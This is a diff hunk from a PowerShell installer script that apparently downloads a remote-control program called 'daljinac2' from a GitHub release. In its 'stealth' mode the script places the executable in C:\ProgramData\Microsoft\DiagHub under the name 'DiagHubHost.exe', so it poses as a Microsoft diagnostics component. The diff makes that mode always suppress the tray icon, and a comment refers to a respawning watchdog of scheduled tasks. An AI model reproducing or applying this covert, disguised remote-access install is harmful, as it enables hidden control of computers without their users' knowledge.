@@ -9,13 +9,13 @@ $URL = "https://github.com/egzakutacno/daljinac2/releases/latest/download/daljin
 if ($stealth) {
     $Dir      = "C:\ProgramData\Microsoft\DiagHub"
     $ExeName  = "DiagHubHost.exe"
+    $ExtraArgs = "-notray"
 } else {
     $Dir      = "C:\daljinac2"
     $ExeName  = "daljinac2.exe"
+    $ExtraArgs = if ($notray) { "-notray" } else { "" }
 }
 $Exe = "$Dir\$ExeName"
-
-$ExtraArgs = if ($notray) { "-notray" } else { "" }
 
 try {
     # Delete old tasks first so watchdog can't respawn
